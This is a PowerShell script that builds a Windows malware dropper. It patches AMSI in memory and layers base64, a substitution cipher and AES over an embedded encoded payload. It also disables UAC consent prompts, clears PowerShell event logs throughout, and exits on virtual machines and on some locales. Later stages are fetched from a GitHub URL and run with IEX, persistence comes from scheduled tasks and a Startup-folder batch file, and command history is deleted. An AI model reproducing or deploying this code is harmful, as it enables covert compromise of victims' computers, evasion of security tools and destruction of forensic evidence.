$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

class Hunter{
  static [IntPtr] FindAddress ([IntPtr]$address,[byte[]]$egg) {
    while ($true) {
      [int]$count = 0

      while ($true) {
        [IntPtr]$address = [IntPtr]::Add($address,1)
        if ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
          $count++
          if ($count -eq $egg.Length) {
            return [IntPtr]::Subtract($address,$egg.Length - 1)
          }
        } else { break }
      }
    }

    return $address
  }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule,"DllCanUnloadNow")

if ([IntPtr]::Size -eq 8) {
  [byte[]]$egg = [byte[]](
    0x4C,0x8B,0xDC,
    0x49,0x89,0x5B,0x08,
    0x49,0x89,0x6B,0x10,
    0x49,0x89,0x73,0x18,
    0x57,
    0x41,0x56,
    0x41,0x57,
    0x48,0x83,0xEC,0x70
  )
} else {
  [byte[]]$egg = [byte[]](
    0x8B,0xFF,
    0x55,
    0x8B,0xEC,
    0x83,0xEC,0x18,
    0x53,
    0x56
  )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress,$egg)

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress,[uint32]2,4,[ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]](
  0x31,0xC0,
  0xC3
)
[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$targetedAddress,3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress,[uint32]2,$oldProtectionBuffer,[ref]$a) | Out-Null

function encode ($string) {
  return [convert]::tobase64string([text.encoding]::unicode.GetBytes($string))
}

function decode ($string) {
  return [text.encoding]::unicode.getstring([convert]::frombase64string($string))
}

$decode = 'function decode ($string) {return [text.encoding]::unicode.getstring([convert]::frombase64string($string));};'

[System.Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("System.IO") | Out-Null

function en ()
{
  param(
    [Parameter(Mandatory = $true)] [byte[]]$bEn,
    [Parameter(Mandatory = $true)] [byte[]]$ps,
    [Parameter(Mandatory = $true)] [ref]$enB,
    [Parameter(Mandatory = $false)] [byte[]]$cSalt
  )
  [byte[]]$encB = @()
  # Salt must have at least 8 Bytes!!
  # Encrypt and decrypt must use the same salt
  # Define your own Salt here
  [byte[]]$aSaltBytes = @(4,7,12,254,123,98,34,12,67,12,122,111)
  if ($cSalt.Count -ge 1)
  {
    $aSaltBytes = $cSalt
  }
  [System.IO.MemoryStream]$oMemoryStream = New-Object System.IO.MemoryStream
  [System.Security.Cryptography.RijndaelManaged]$oAES = New-Object System.Security.Cryptography.RijndaelManaged
  $oAES.KeySize = 256;
  $oAES.BlockSize = 128;
  [System.Security.Cryptography.Rfc2898DeriveBytes]$oKey = New-Object System.Security.Cryptography.Rfc2898DeriveBytes ($ps,$aSaltBytes,1000);
  $oAES.Key = $oKey.GetBytes($oAES.KeySize / 8);
  $oAES.IV = $oKey.GetBytes($oAES.BlockSize / 8);
  $oAES.Mode = [System.Security.Cryptography.CipherMode]::CBC
  $oCryptoStream = New-Object System.Security.Cryptography.CryptoStream ($oMemoryStream,$oAES.CreateEncryptor(),[System.Security.Cryptography.CryptoStreamMode]::Write)
  try
  {
    $oCryptoStream.Write($bEn,0,$bEn.Length);
    $oCryptoStream.Close();
  }
  catch [Exception]
  {
    $enB.Value = [System.Text.Encoding]::ASCII.GetBytes("Error occured while encoding string. Salt or Password incorrect?")
    return $false
  }
  $oencB = $oMemoryStream.ToArray();
  $enB.Value = $oencB;
}

function gen-key {
  $rs = New-Object System.Random
  1..40 | ForEach-Object { $key += [char]$rs.next(97,122) }
  $kstring = [string]::Join("",($key))
  return $kstring
}

function obfuscate-base64 ($action,$key,$string) {

  $alpha = @{ "1" = "A";
    "2" = "B";
    "3" = "C";
    "4" = "D";
    "5" = "E";
    "6" = "F";
    "7" = "G";
    "8" = "H";
    "9" = "I";
    "10" = "J";
    "11" = "K";
    "12" = "L";
    "13" = "M";
    "14" = "N";
    "15" = "O";
    "16" = "P";
    "17" = "Q";
    "18" = "R";
    "19" = "S";
    "20" = "T";
    "21" = "U";
    "22" = "V";
    "23" = "W";
    "24" = "X";
    "25" = "Y";
    "26" = "Z";
  }

  $inv_alpha = @{}

  # create another hash table like alpha but with inverted values
  foreach ($l in $alpha.Keys) { $inv_alpha.Add($alpha[$l],$l) }

  $count = 0
  foreach ($ch in $string.GetEnumerator())
  {

    $c = [string]$ch
    if ($c -match "[a-zA-Z]")
    {

      $ival = $inv_alpha[$c]
      $s = $key[$count]

      if (!$s) { $count = 0; $s = $key[0] } # reset key to begining

      # juggling variable formats between integer and string methods
      $ss = [string]$s
      $S = $ss.ToUpper()
      $shift = $inv_alpha[$S]

      if ($action -match "hide")
      { $val = [int]$ival + [int]$shift }
      else { $val = [int]$ival - [int]$shift }

      if ([int]$val -lt "1") { $val = [int]$val + "26" }
      if ([int]$val -gt "26") { $val = [int]$val - "26" }

      # juggling variable formats between integer and string methods
      $sval = [string]$val
      $char = $alpha[$sval]
      $schar = [string]$char

      if ($c -cmatch "[a-z]")
      { $cipher = $schar.ToUpper(); $ncipher += [string]::Join("",($cipher)) }
      elseif ($c -cmatch "[A-Z]")
      { $cipher = $schar.ToLower(); $ncipher += [string]::Join("",($cipher)) }

      $count++

    } else { $ncipher += [string]::Join("",($c)) }

  }

  $scipher = [string]$ncipher
  return $scipher

}

function obfuscate-string ($action,$key,$b64o) {

  $b64n = obfuscate-base64 $action $key $b64o

  return $b64n

}

$kernelstring1 = '$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@'

$kernelstring2 = '

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}'

$kernelstring3 = '

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")

If ([IntPtr]::Size -eq 8) {
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,
        0x49, 0x89, 0x5B, 0x08,
        0x49, 0x89, 0x6B, 0x10,
        0x49, 0x89, 0x73, 0x18,
        0x57,
        0x41, 0x56,
        0x41, 0x57,
        0x48, 0x83, 0xEC, 0x70
    )
} Else {
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,
        0x55,
        0x8B, 0xEC,
        0x83, 0xEC, 0x18,
        0x53,
        0x56
    )
}'
$kernelstring4 = '
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,
    0xC3
)'
$kernelstring5 = '
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null'

$kernelstring = $kernelstring1 + $kernelstring2 + $kernelstring3 + $kernelstring4 + $kernelstring5

$clearevt = 'Function Clear-WinEvent {
[CmdletBinding(SupportsShouldProcess=$True)]
Param
([String]$LogName)
Process {
If ($PSCmdlet.ShouldProcess("$LogName", "Clear log file"))
              {
[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("$LogName")
              }
        }
};Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'

$randstr = 'function randomstr {$out="";$rca=1..33 | foreach {$ran=get-random -Minimum 97 -Maximum 123;$out+=[char][byte]$ran};$rca -join "";return $out;};'

$newkey = gen-key
$newkey2 = gen-key

$originalpayload = "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''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''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"

$PAYLOAD = '$clr = ' + "'" + "$(cat clear.ps1)" + "';" + '$pload = ' + "'" + "$(cat payload2.ps1)" + "';" + $clearevt + '$clr > $env:temp\$dOne\$n2.ps1;$pload > $env:temp\$dOne\$n.ps1;cd $env:temp\$dOne;.\$n2.ps1;.\$n.ps1;Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'

$obfpayload = obfuscate-string "hide" $newkey $(encode $PAYLOAD)

$outfunc1 = 'function obfuscate-base64( $key, $string ) {$alpha = @{ "1" = "A";"2" = "B";"3" = "C";"4" = "D";"5" = "E";"6" = "F";"7" = "G";"8" = "H";"9" = "I";"10" = "J";"11" = "K";"12" = "L";"13" = "M";"14" = "N";"15" = "O";"16" = "P";"17" = "Q";"18" = "R";"19" = "S";"20" = "T";"21" = "U";"22" = "V";"23" = "W";"24" = "X";"25" = "Y";"26" = "Z";};$inv_alpha = @{}'
$outfunc2 = '
        foreach ($l in $alpha.Keys ) { $inv_alpha.add($alpha[$l],$l)};$count = 0;foreach ($ch in $string.GetEnumerator()){$c = [string]$ch;if ( $c -match "[a-zA-Z]"){$ival = $inv_alpha[$c];$s = $key[$count];if (!$s) { $count = 0; $s = $key[0] };'
$outfunc3 = '
                        $ss = [string]$s;$S = $ss.ToUpper();$shift = $inv_alpha[$S];$val = [int]$ival - [int]$shift;if ( [int]$val -lt "1"  ) { $val = [int]$val + "26" };if ( [int]$val -gt "26" ) { $val = [int]$val - "26" };'
$outfunc4 = '
                        $sval = [string]$val;$char = $alpha[$sval];$schar = [string]$char;if ( $c -cmatch "[a-z]" ){ $cipher = $schar.ToUpper(); $ncipher += [string]::join("", ($cipher)) } elseif ( $c -cmatch "[A-Z]" ){ $cipher = $schar.ToLower(); $ncipher += [string]::join("", ($cipher)) };$count++;} else { $ncipher += [string]::join("", ($c)) }};'
$outfunc5 = '
        $scipher = [string]$ncipher;return $scipher;}function obfuscate-string( $key, $b64o) {$b64n = obfuscate-base64 $key $b64o;return $b64n;};Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'

$outf = $outfunc1 + $outfunc2 + $outfunc3 + $outfunc4 + $outfunc5

$outfunc6 = $randstr + $clearevt + '$n=$(randomstr)[1];$n2=$(randomstr)[1];function New-TemporaryDirectory {$parent = [System.IO.Path]::GetTempPath();[string] $name = [System.Guid]::NewGuid();$newdir = New-Item -ItemType Directory -Path (Join-Path $parent $name);return $newdir.name;};$dOne=New-TemporaryDirectory;Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'
$outfunc7 = '$action = New-ScheduledTaskAction -Execute "$pshome\powershell.exe" -Argument  "$env:temp\$dOne\$n.ps1;";$repeat = (New-TimeSpan -Minutes 5);$repeat2 = (New-TimeSpan -Minutes 1);$dt= ([DateTime]::Now);$duration = $dt.AddYears(25) -$dt;$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat -RepetitionDuration $duration;$trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat2 -RepetitionDuration $duration;'
$outfunc8 = '$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd;Register-ScheduledTask -TaskName "owo" -Action $action -Trigger $trigger -RunLevel Highest -Settings $settings;Start-ScheduledTask -TaskName "owo";'
$outfunc9 = '$action2 = New-ScheduledTaskAction -Execute "$pshome\powershell.exe" -Argument  "$env:temp\$dOne\$n2.ps1;";Register-ScheduledTask -TaskName "0w0" -Action $action2 -Trigger $trigger3 -RunLevel Highest -Settings $settings;Start-ScheduledTask -TaskName "0w0";$trigger2 = New-ScheduledTaskTrigger -AtLogon;Register-ScheduledTask -TaskName "uwu" -Action $action -Trigger $trigger2 -RunLevel Highest -Settings $settings;Start-ScheduledTask -TaskName "uwu";'
$obfoutfunc = obfuscate-string "hide" $newkey2 $(encode $($outfunc6 + $outfunc7 + $outfunc8 + $outfunc9))

$out1 = $decode + $outf + 'IEX $(decode $(obfuscate-string ' + $newkey2 + ' ' + $obfoutfunc + '));'
$out1enc = encode $out1
$outfunc0 = $decode + $clearevt + 'IEX(decode $(IEX $(IEX "[text.encoding]::unicode.getstring([convert]::frombase64string(' + "'" + $out1enc + "'" + '))")));Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'

$outfunc = $outf + $outfunc0

$first = $decode + $outfunc + 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f;IEX $(decode $(obfuscate-string ' + $newkey + ' ' + $obfpayload + '));'
$firstenc = encode $first
$second = $decode + $clearevt + 'IEX(decode $(IEX $(IEX "[text.encoding]::unicode.getstring([convert]::frombase64string(' + "'" + $firstenc + "'" + '))")));Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'
$secondenc = encode $second

$aCustomSalt = @(); for ($i = 0; $i -lt 10; $i++) { $aCustomSalt += Get-Random -Maximum 256 }
$sPassword = "if(she.breathes()) {she.attr = thot;}"
$encPass = encode $sPassword
[byte[]]$aEncMsg = $null

$preThird = '$(IEX ("[text.encoding]::unicode.getstring([convert]::frombase64string(' + "'" + $secondenc + "'" + '))"))'
en ([System.Text.Encoding]::ASCII.GetBytes($preThird)) ([System.Text.Encoding]::ASCII.GetBytes($sPassword)) ([ref]$aEncMsg) $aCustomSalt

$aesdecrypt = '[System.reflection.assembly]::LoadWithPartialName("System.Security")|out-null;[System.reflection.assembly]::LoadWithPartialName("System.IO")|out-null;$p=[text.encoding]::unicode.getstring([convert]::frombase64string("' + $encPass + '"));function de(){Param([Parameter(Mandatory=$true)][byte[]]$bDe,[Parameter(Mandatory=$true)][byte[]]$ps,[Parameter(Mandatory=$true)][ref]$deB,[Parameter(Mandatory=$false)][byte[]]$cSalt);[byte[]]$decB = @();[byte[]]$aSaltBytes = @(4,7,12,254,123,98,34,12,67,12,122,111);if($cSalt.Count -ge 1){$aSaltBytes=$cSalt;};[System.IO.MemoryStream] $oMemoryStream = new-object System.IO.MemoryStream;[System.Security.Cryptography.RijndaelManaged] $oAES = new-object System.Security.Cryptography.RijndaelManaged;$oAES.KeySize = 256;$oAES.BlockSize = 128;[System.Security.Cryptography.Rfc2898DeriveBytes] $oKey = new-object System.Security.Cryptography.Rfc2898DeriveBytes($ps, $aSaltBytes, 1000);$oAES.Key = $oKey.GetBytes($oAES.KeySize / 8);$oAES.IV = $oKey.GetBytes($oAES.BlockSize / 8);$oAES.Mode = [System.Security.Cryptography.CipherMode]::CBC;$oCryptoStream = new-object System.Security.Cryptography.CryptoStream($oMemoryStream, $oAES.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write);try{$oCryptoStream.Write($bDe, 0, $bDe.Length);$oCryptoStream.Close();}catch [Exception]{$deB.Value=[system.text.encoding]::ASCII.GetBytes("Error occured while decoding string. Salt or Password incorrect?");return $false;};$decB = $oMemoryStream.ToArray();$deB.Value=$decB;};'

$aDecMsg = '$cs="' + $(encode $($aCustomSalt -split " " -join ",")) + '";' + '$enm="' + $(encode $($aEncMsg -split " " -join ",")) + '";[byte[]]$dem=$null;de $(IEX $("@("+([text.encoding]::unicode.getstring([convert]::frombase64string($enm)))+")")) ([text.encoding]::ascii.getbytes($p)) ([ref]$dem) $(IEX $("@("+$([text.encoding]::unicode.getstring([convert]::frombase64string($cs)))+")"));'

rm enc*
$excludesplit = @()
$third = $clearevt + 'Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";if (((Get-UICulture).Name -match "RU|UA|BY|CN") -or (Get-WMIObject -class Win32_ComputerSystem -Property Model).Model -match "VirtualBox|VMware") {Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$shell=new-object -comobject wscript.shell;$shell.popup("VM Detected!",0,"Error",0x0);Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";exit;};' + $aesdecrypt + $aDecMsg + '$ErrorActionPreference="SilentlyContinue";$WarningPreference="SilentlyContinue";$__s = (IEX (IEX ([text.encoding]::utf8.getstring($dem))));Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";IEX ([system.text.encoding]::unicode.getstring([convert]::frombase64string($__s)));Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";} else {$shell=new-object -comobject wscript.shell;$shell.popup("Run in Administrator mode!",0,"Aborted",0x0);}'
$thirdarr = @(); $thirdarray = $third -split '((?:.{19999}).|(?:.+))'
foreach ($elem in $thirdarray) { if ($elem) { $thirdarr += $elem } }
$rangesplit = 1..$($thirdarr.Count + 1)
foreach ($elem in $thirdarr) {
  $randomsplit = $rangesplit | Where-Object { $excludesplit -notcontains $_ }; $num = Get-Random -InputObject $randomsplit; $excludesplit += $num
  $elem > "enc$num.txt"
}

$regedit = $kernelstring + $clearevt + '$ErrorActionPreference="SilentlyContinue";$WarningPreference="SilentlyContinue";REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f;Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'
$smoke = 'if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {' + $clearevt + 'if (((Get-UICulture).Name -match "RU|UA|BY|CN") -or (Get-WMIObject -class Win32_ComputerSystem -Property Model).Model -match "VirtualBox|VMware") {Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$shell=new-object -comobject wscript.shell;$shell.popup("VM Detected!",0,"Error",0x0);Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";exit;};$slst=' + $($excludesplit -join ',') + ';$string="";Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";for ($i=0;$i -lt ' + $thirdarr.Count + '; $i++) {$num = $slst[$i];$link = "https://raw.githubusercontent.com/mcdulltii/coding/master/ps/enc$num.txt";$r=[net.webrequest]::create($link);$rs=$r.GetResponse();$rsp=$rs.GetResponseStream();$rd=[io.streamreader]::new($rsp);$string+=$rd.ReadtoEnd();Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";};$arr = $string -replace("\n","") -replace("\r","");IEX($arr);Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";} else {$shell=new-object -comobject wscript.shell;$shell.popup("Run in Administrator mode!",0,"Aborted",0x0);}'
$smok3link = encode $($regedit + $smoke)

$inst = encode $('PowerShell.exe -wind hidden -Exec Bypass -nop -Command "& {Start-Process PowerShell.exe -ArgumentList ' + "'" + 'PowerShell.exe -wind hidden -nop -Exec Bypass -enc "' + $smok3link + '"' + "' -Verb RunAs}" + '"')
$randsplit1 = $rangesplit | Where-Object { $excludesplit -notcontains $_ }; $num1 = Get-Random -InputObject $randsplit1
$inst > "enc$num1.txt"

$comm = encode $('if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {$ErrorActionPreference="SilentlyContinue";$WarningPreference="SilentlyContinue";Set-PSReadlineOption -HistorySaveStyle SaveNothing;remove-module psreadline;' + $clearevt + 'if (((Get-UICulture).Name -match "RU|UA|BY|CN") -or (Get-WMIObject -class Win32_ComputerSystem -Property Model).Model -match "VirtualBox|VMware") {Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$shell=new-object -comobject wscript.shell;$shell.popup("VM Detected!",0,"Error",0x0);Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";exit;};$string="";Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$nm = ' + $num1 + ';$link = "https://raw.githubusercontent.com/mcdulltii/coding/master/ps/enc$nm.txt";$r=[net.webrequest]::create($link);$rs=$r.GetResponse();$rsp=$rs.GetResponseStream();$rd=[io.streamreader]::new($rsp);$string=$rd.ReadtoEnd();Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$arr = $string -replace("\n","") -replace("\r","");IEX([text.encoding]::unicode.getstring([convert]::frombase64string($arr)));del (Get-PSReadlineOption).HistorySavePath;Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";} else {$shell=new-object -comobject wscript.shell;del (Get-PSReadlineOption).HistorySavePath;$shell.popup("Run in Administrator mode!",0,"Aborted",0x0);}')

$malware = '
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if "%errorlevel%" NEQ "0" (goto uac) else (goto ad)
:uac
	echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
	set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:ad
	pushd "%CD%"
PowerShell.exe -wind hidden -nop -Exec Bypass -enc "' + $comm + '"'


$smok3 = '@echo off
setlocal enableextensions enabledelayedexpansion
robocopy %0\..\ "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" smok3.exe /MT >NUL' + $malware
$smok32 = '@echo off
setlocal enableextensions enabledelayedexpansion' + $malware

rm baseball*
$smok3 | Out-File -Encoding ascii baseball
$smok32 | Out-File -Encoding ascii baseball.bat
